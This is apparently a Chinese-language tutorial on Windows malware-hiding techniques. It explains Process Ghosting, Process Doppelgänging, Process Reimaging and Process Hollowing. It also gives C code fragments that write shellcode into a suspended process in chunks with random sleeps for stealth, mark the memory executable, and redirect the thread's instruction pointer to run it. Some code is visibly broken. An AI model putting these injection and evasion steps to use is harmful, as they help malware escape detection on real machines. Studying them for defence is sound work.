# Process Ghosting

## 现代 Windows 创建进程的基本流程

使用 CreateFile API 打开可执行文件，获取文件句柄：

```
hFile = CreateFile("C:\Windows\System32\svchost.exe")
```

创建文件映像，通过 NtCreateSection 将文件内容映射到内存中：

```
hSection = NtCreateSection(hFile, SEC_IMAGE)
```

使用内存映像创建进程对象：

```
hProcess = NtCreateProcessEx(hSection)
```

1. **设置进程环境**

配置进程所需的环境变量和参数。

1. **创建主线程**

通过 NtCreateThreadEx 创建进程的主线程，启动执行：

```
NtCreateThreadEx(...)
```

## Process Ghosting 技术解析

**核心原理**：利用文件删除标志实现无实体文件的进程执行。

**文件删除机制**（非传统 Del 命令）：

1. **方式一**：在 CreateFile/NtOpenFile 时设置以下标志：


* FILE\_DELETE\_ON\_CLOSE


* FILE\_SUPERSEDE


* FILE\_FLAG\_DELETE\_ON\_CLOSE

1. **方式二**：通过 NtSetInformationFile 设置 FILE\_DISPOSITION\_INFORMATION 结构的 DeleteFile 字段为 TRUE。

**关键条件**：需在文件内容被映射到进程内存（Section）后关闭句柄，删除标志才会生效。

## Process Ghosting 攻击流程

1. **创建临时文件**

创建一个用于存储恶意载荷的临时文件。

1. **设置删除挂起状态**

通过 NtSetInformationFile 设置 FileDispositionInformation，将文件标记为 "删除挂起"。

*注意*：单独使用 FILE\_DELETE\_ON\_CLOSE 无法完成此操作。

1. **写入恶意载荷**

将恶意代码写入临时文件，但由于文件已处于删除挂起状态，内容不会持久化，且外部无法再次打开该文件。

1. **创建内存映像**

使用 NtCreateSection 将文件内容映射到内存中。

1. **删除物理文件**

关闭文件句柄，触发删除标志，删除物理文件。

1. **创建幽灵进程**

使用内存中的映像（Section）创建进程：

```
hProcess = NtCreateProcessEx(hSection)
```

1. **配置进程环境**

设置进程参数和环境变量。

1. **执行恶意代码**

通过 NtCreateThreadEx 创建线程，在新进程中执行恶意载荷。

### 与 Process Doppelgänging 的对比

Process Ghosting 与 Process Doppelgänging 技术在本质上有相似之处，它们都是通过对文件进行删除相关的操作来实现特定目的。

Process Ghosting 利用的是文件删除标志（如 Delete On Close），其实现文件删除的方式是在将文件映射到内存后删除物理文件。

而 Process Doppelgänging 技术则是利用 NTFS 的事务回滚机制，通过事务的提交与回滚来实现文件内容的替换，进而达到类似的文件处理效果。

这两种技术的共同点在于，都实现了无实体文件（或文件内容不可见）的进程执行，从而增强了恶意软件的隐蔽性。

# 进程注入之进程重塑

Process Reimaging 的原理基于操作系统对文件和进程的管理方式。在Windows系统中，当一个可执行文件启动为一个进程时，操作系统会创建一个到该文件的活动引用。这个引用保持有效，直到进程终止。然而，文件系统允许在不影响已经打开的文件引用的情况下修改或替换磁盘上的文件。利用这一点，Process Reimaging 技术可以在不终止进程的情况下替换或修改正在运行的程序的代码。可以欺骗安全产品，使其在错误的路径上查找加载的映像。

其最终实现效果也是内存中的内容和磁盘文件不一样，我们接下来依然通过代码来学习

# 进程注入之进程空洞

英文名：Process Hollowing

# 简介

进程空洞化（Process hollowing）是恶意行为者用于隐藏进程存在的又一工具。其原理相当直接：引导应用程序（bootstrap application）会以挂起状态（suspended state）创建一个看似无害的进程。随后，该合法镜像会被取消映射（unmapped），并替换为需要隐藏的镜像。若新镜像的首选基址（preferred image base）与旧镜像不匹配，则必须对新镜像进行基址重定位（rebased）。当新镜像加载到内存后，挂起线程的 EAX 寄存器（EAX register）会被设置为入口点（entry point）。最后，进程恢复运行，新镜像的入口点将被执行。

```
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE) {
        _tprintf(_T("Error creating snapshot (%d)

    pe32.dwSize = sizeof(PROCESSENTRY32);

    DWORD topParentProcessId = 0;

    // Retrieve information about the first process in the snapshot
    if (!Process32First(hSnapshot, &pe32)) {
        _tprintf(_T("Error retrieving process information (%d)
"), GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }
}
    // Iterate through the processes
    do {
        if (_tcsicmp(pe32.szExeFile, processName) == 0) {
            topParentProcessId = pe32.th32ProcessID;
            break;  // Stop iterating when the process with the specified name is found
        }
    } while (Process32Next(hSnapshot, &pe32));

    // If the process with the specified name was found, get its parent process ID
    if (topParentProcessId != 0) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, topParentProcessId);
        if (hProcess != NULL) {
            DWORD parentProcessId;
            if (GetParentProcessId(topParentProcessId, &parentProcessId)) {
                HANDLE hParentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentProcessId);
                if (hParentProcess != NULL) {
                    TCHAR szParentName[MAX_PATH];

                    if (GetProcessImageFileName(hParentProcess, szParentName, MAX_PATH) > 0 &&
                        _tcsicmp(szParentName, processName) == 0) {
                        topParentProcessId = parentProcessId;
                    }

                    CloseHandle(hParentProcess);
                }
            }
            CloseHandle(hProcess);
        }
    }

    CloseHandle(hSnapshot);
    return topParentProcessId;
}
```

```
    for (int i = 0; i < totalSize; i += CHUNK_SIZE) {
        SIZE_T chunkSize = min(CHUNK_SIZE, totalSize - i);
        SIZE_T bytesWritten;

        
        if (i % (10 * CHUNK_SIZE) == 0) Sleep(rand() % 50);

        status = NtWriteVirtualMemory(
            hProcess, (PBYTE)remoteMem + i, (PBYTE)buf + i,
            chunkSize, &bytesWritten
        );
    }
```

可以看到也是用系统调用`NtWriteVirtualMemory`分块的将shellcode输入到内存中去，同时可以看到每十次写入之后，会随机sleep多少毫秒，增加了隐蔽性。也是一种思路。

然后就是将shellcode注入内存之中

```
    ULONG oldProtect;
    NtProtectVirtualMemory(hProcess, &remoteMem, &totalSize,
        PAGE_EXECUTE_READ, &oldProtect);
```

这里先把目标内存设置成可读可执行的,同样也是用的系统调用

下面是进程注入的部分

```
CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    NtGetContextThread(pi.hThread, &ctx);
    ctx.Rip = (DWORD64)remoteMem; 
    NtSetContextThread(pi.hThread, &ctx);
```

先获取当前进程的寄存器状态，将寄存器状态设置成之前写入的shellcode

```
    NtResumeThread(pi.hThread, NULL);

    return 1;
```

最后恢复线程状态，就会执行之前的shellcode。
